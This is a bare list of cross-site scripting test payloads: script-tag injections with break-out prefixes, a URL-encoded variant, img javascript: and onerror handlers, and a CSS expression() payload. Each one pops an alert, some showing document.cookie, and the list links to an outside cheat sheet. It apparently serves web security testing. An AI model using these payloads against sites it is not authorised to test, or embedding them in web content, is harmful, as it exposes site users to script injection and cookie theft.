# XSS
<script>alert(/xss/)</script>
><script>alert(document.cookie)</script>
='><script>alert(document.cookie)</script>
"><script>alert(document.cookie)</script>
<script>alert(document.cookie)</script>
<script>alert (vulnerable)</script>
%3Cscript%3Ealert('XSS')%3C/script%3E
ºhttps://brutelogic.com.br/blog/xss-cheat-sheet/
< img src="javascript:alert('XSS')">
< img src="http://888.888.com/999.png" onerror="alert('XSS')">
<div style="height:expression(alert('XSS'),1)"></div>